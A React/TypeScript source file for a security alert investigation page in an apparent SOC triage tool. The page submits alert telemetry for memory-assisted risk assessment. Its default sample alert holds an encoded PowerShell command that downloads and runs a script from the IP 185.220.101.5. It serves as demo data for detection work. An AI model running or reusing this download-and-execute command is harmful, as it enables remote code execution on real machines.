import React, { useState, useEffect } from 'react';
import {
  Shield, Brain, Search, Terminal, AlertTriangle, ArrowRight,
  Loader2, RefreshCw, Send, Sparkles, CheckCircle2, History
} from 'lucide-react';
import { Alert, DemoAlert, InvestigationResult } from '../types';
import { SeverityBadge } from '../components/SeverityBadge';
import { MemoryUsedPanel } from '../components/MemoryUsedPanel';
import { InvestigationResultCard } from '../components/InvestigationResultCard';
import { IncidentTimeline } from '../components/IncidentTimeline';
import { FeedbackPanel } from '../components/FeedbackPanel';
import { api } from '../services/api';

interface InvestigationPageProps {
  initialAlert?: DemoAlert | null;
}

export const InvestigationPage: React.FC<InvestigationPageProps> = ({ initialAlert }) => {
  const [prebuiltAlerts, setPrebuiltAlerts] = useState<DemoAlert[]>([]);
  const [selectedDemoId, setSelectedDemoId] = useState<string>('demo-1');

  // Form state
  const [alertId, setAlertId] = useState('ALT-1042');
  const [host, setHost] = useState('FINANCE-PC-17');
  const [severity, setSeverity] = useState<'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFORMATIONAL'>('HIGH');
  const [process, setProcess] = useState('powershell.exe');
  const [parentProcess, setParentProcess] = useState('winword.exe');
  const [command, setCommand] = useState(
    'powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHAAJwApAA=='
  );
  const [destination, setDestination] = useState('185.220.101.5:443');
  const [user, setUser] = useState('CORP\\jsmith');
  const [rawLog, setRawLog] = useState('');

  // Investigation state
  const [isInvestigating, setIsInvestigating] = useState(false);
  const [pipelineStep, setPipelineStep] = useState<number>(0);
  const [result, setResult] = useState<InvestigationResult | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Load prebuilt demo alerts on mount
  useEffect(() => {
    api.getPrebuiltAlerts().then((alerts) => {
      setPrebuiltAlerts(alerts);
      if (initialAlert) {
        populateForm(initialAlert);
      } else if (alerts.length > 0) {
        populateForm(alerts[0]);
      }
    }).catch(console.error);
  }, []);

  useEffect(() => {
    if (initialAlert) {
      populateForm(initialAlert);
    }
  }, [initialAlert]);

  const populateForm = (demo: DemoAlert) => {
    setSelectedDemoId(demo.id);
    setAlertId(demo.alert.alert_id);
    setHost(demo.alert.host);
    setSeverity(demo.alert.severity);
    setProcess(demo.alert.process);
    setParentProcess(demo.alert.parent_process);
    setCommand(demo.alert.command);
    setDestination(demo.alert.destination || '');
    setUser(demo.alert.user || 'CORP\\user');
    setRawLog(demo.alert.raw_log || '');
  };

  const handleDemoSelect = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const found = prebuiltAlerts.find(a => a.id === e.target.value);
    if (found) populateForm(found);
  };

  const handleInvestigate = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsInvestigating(true);
    setResult(null);
    setErrorMsg(null);
    setPipelineStep(1);

    // Simulate animated pipeline step transitions for SOC visual feedback
    const t1 = setTimeout(() => setPipelineStep(2), 300);
    const t2 = setTimeout(() => setPipelineStep(3), 700);
    const t3 = setTimeout(() => setPipelineStep(4), 1100);

    try {
      const payload: Alert = {
        alert_id: alertId,
        host,
        severity,
        process,
        parent_process: parentProcess,
        command,
        destination: destination || undefined,
        user: user || undefined,
        raw_log: rawLog || undefined
      };

      const res = await api.investigateAlert(payload);
      setPipelineStep(5);
      setResult(res);
    } catch (err: any) {
      setErrorMsg(err.message || 'Investigation failed');
    } finally {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
      setIsInvestigating(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* Page Title & Preset Selector */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
        <div>
          <h2 className="text-xl font-bold text-white font-mono flex items-center gap-2">
            <Shield className="w-5 h-5 text-sky-400" />
            <span>SECURITY ALERT INVESTIGATION WORKBENCH</span>
          </h2>
          <p className="text-xs text-slate-400">
            Submit an alert to parse telemetry, recall organizational memory from Hindsight, and evaluate risk.
          </p>
        </div>

        {/* Demo Alert Quick Selector */}
        <div className="flex items-center space-x-2">
          <span className="text-xs font-mono text-slate-400 whitespace-nowrap">Load Preset:</span>
          <select
            value={selectedDemoId}
            onChange={handleDemoSelect}
            className="px-3 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-xs text-sky-300 font-mono focus:outline-none focus:border-sky-500"
          >
            {prebuiltAlerts.map(a => (
              <option key={a.id} value={a.id}>{a.name}</option>
            ))}
          </select>
        </div>
      </div>

      {/* Alert Form Input */}
      <form onSubmit={handleInvestigate} className="glass-panel p-5 rounded-xl border border-sky-500/20 space-y-4">
        <div className="flex items-center justify-between border-b border-slate-800 pb-2">
          <span className="text-xs font-bold text-slate-300 uppercase tracking-wider font-mono">
            Alert Parameters & Execution Telemetry
          </span>
          <span className="text-[11px] font-mono text-slate-500">Synthetic Enterprise Telemetry</span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-4">
          <div>
            <label className="block text-xs font-mono text-slate-400 mb-1">Alert ID</label>
            <input
              type="text"
              value={alertId}
              onChange={(e) => setAlertId(e.target.value)}
              className="w-full px-3 py-1.5 rounded-lg bg-slate-900/90 border border-slate-800 text-xs font-mono text-white focus:outline-none focus:border-sky-500"
              required
            />
          </div>

          <div>
            <label className="block text-xs font-mono text-slate-400 mb-1">Host / Endpoint</label>
            <input
              type="text"
              value={host}
              onChange={(e) => setHost(e.target.value)}
              className="w-full px-3 py-1.5 rounded-lg bg-slate-900/90 border border-slate-800 text-xs font-mono text-white focus:outline-none focus:border-sky-500"
              required
            />
          </div>

          <div>
            <label className="block text-xs font-mono text-slate-400 mb-1">Severity</label>
            <select
              value={severity}
              onChange={(e: any) => setSeverity(e.target.value)}
              className="w-full px-3 py-1.5 rounded-lg bg-slate-900/90 border border-slate-800 text-xs font-mono text-white focus:outline-none focus:border-sky-500"
            >
              <option value="CRITICAL">CRITICAL</option>
              <option value="HIGH">HIGH</option>
              <option value="MEDIUM">MEDIUM</option>
              <option value="LOW">LOW</option>
              <option value="INFORMATIONAL">INFORMATIONAL</option>
            </select>
          </div>

          <div>
            <label className="block text-xs font-mono text-slate-400 mb-1">Parent Process</label>
            <input
              type="text"
              value={parentProcess}
              onChange={(e) => setParentProcess(e.target.value)}
              className="w-full px-3 py-1.5 rounded-lg bg-slate-900/90 border border-slate-800 text-xs font-mono text-white focus:outline-none focus:border-sky-500"
              required
            />
          </div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          <div>
            <label className="block text-xs font-mono text-slate-400 mb-1">Process Name</label>
            <input
              type="text"
              value={process}
              onChange={(e) => setProcess(e.target.value)}
              className="w-full px-3 py-1.5 rounded-lg bg-slate-900/90 border border-slate-800 text-xs font-mono text-white focus:outline-none focus:border-sky-500"
              required
            />
          </div>

          <div>
            <label className="block text-xs font-mono text-slate-400 mb-1">Destination IP:Port</label>
            <input
              type="text"
              value={destination}
              onChange={(e) => setDestination(e.target.value)}
              placeholder="e.g. 185.220.101.5:443 or None"
              className="w-full px-3 py-1.5 rounded-lg bg-slate-900/90 border border-slate-800 text-xs font-mono text-white focus:outline-none focus:border-sky-500"
            />
          </div>

          <div>
            <label className="block text-xs font-mono text-slate-400 mb-1">User Context</label>
            <input
              type="text"
              value={user}
              onChange={(e) => setUser(e.target.value)}
              className="w-full px-3 py-1.5 rounded-lg bg-slate-900/90 border border-slate-800 text-xs font-mono text-white focus:outline-none focus:border-sky-500"
            />
          </div>
        </div>

        <div>
          <label className="block text-xs font-mono text-slate-400 mb-1">Executed Command Line</label>
          <textarea
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            rows={2}
            className="w-full px-3 py-2 rounded-lg bg-slate-900/90 border border-slate-800 text-xs font-mono text-slate-200 focus:outline-none focus:border-sky-500"
            required
          />
        </div>

        {errorMsg && (
          <div className="p-3 rounded-lg bg-rose-950/40 border border-rose-500/40 text-xs text-rose-300">
            {errorMsg}
          </div>
        )}

        <div className="flex items-center justify-between pt-2">
          <span className="text-[11px] text-slate-400">
            Pipeline: Parse Alert → Query Hindsight → Recall Precedents → Context-Aware Assessment
          </span>

          <button
            type="submit"
            disabled={isInvestigating}
            className="flex items-center space-x-2 px-6 py-2.5 rounded-xl bg-gradient-to-r from-sky-600 to-indigo-600 hover:from-sky-500 hover:to-indigo-500 disabled:opacity-50 text-xs font-bold text-white uppercase tracking-wider font-mono shadow-lg shadow-sky-950/50 transition-all cursor-pointer"
          >
            {isInvestigating ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>INVESTIGATING WITH HINDSIGHT...</span>
              </>
            ) : (
              <>
                <Shield className="w-4 h-4" />
                <span>INVESTIGATE ALERT</span>
                <ArrowRight className="w-4 h-4" />
              </>
            )}
          </button>
        </div>
      </form>

      {/* Pipeline Progress Indicator */}
      {isInvestigating && (
        <div className="glass-panel p-5 rounded-xl border border-sky-500/30 space-y-3">
          <div className="flex items-center justify-between text-xs font-mono">
            <span className="text-sky-400 font-bold flex items-center gap-2">
              <Loader2 className="w-4 h-4 animate-spin text-sky-400" />
              EXECUTING HINDSIGHT INVESTIGATION PIPELINE
            </span>
            <span className="text-slate-400">Step {pipelineStep} of 4</span>
          </div>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-[11px] font-mono">
            <div className={`p-2 rounded border ${pipelineStep >= 1 ? 'border-sky-500/50 bg-sky-950/30 text-sky-300' : 'border-slate-800 text-slate-500'}`}>
              1. Normalize Telemetry
            </div>
            <div className={`p-2 rounded border ${pipelineStep >= 2 ? 'border-sky-500/50 bg-sky-950/30 text-sky-300' : 'border-slate-800 text-slate-500'}`}>
              2. Query Hindsight Bank
            </div>
            <div className={`p-2 rounded border ${pipelineStep >= 3 ? 'border-sky-500/50 bg-sky-950/30 text-sky-300' : 'border-slate-800 text-slate-500'}`}>
              3. Recall Precedents
            </div>
            <div className={`p-2 rounded border ${pipelineStep >= 4 ? 'border-emerald-500/50 bg-emerald-950/30 text-emerald-300' : 'border-slate-800 text-slate-500'}`}>
              4. Synthesize Assessment
            </div>
          </div>
        </div>
      )}

      {/* Investigation Results */}
      {result && (
        <div className="space-y-6">
          {/* 1. MEMORY USED PANEL (Section 5 MVP requirement) */}
          <MemoryUsedPanel
            memoryUsed={result.memory_used}
            memoryCount={result.memory_count}
            memoryStatus={result.memory_status}
            historicalMatches={result.historical_matches}
            reflectionSummary={result.hindsight_reflection}
            reasoning={result.reasoning}
          />

          {/* 2. Structured Investigation Report Card */}
          <InvestigationResultCard result={result} />

          {/* 3. Temporal Incident & Memory Timeline */}
          <IncidentTimeline
            alertId={result.alert_id}
            historicalMatches={result.historical_matches}
            recommendedActions={result.recommended_actions}
          />

          {/* 4. Feedback & Memory Retention Panel */}
          <FeedbackPanel
            alertId={result.alert_id}
            investigationId={result.investigation_id}
            onFeedbackSubmitted={() => {
              // Optionally refresh
            }}
          />
        </div>
      )}
    </div>
  );
};
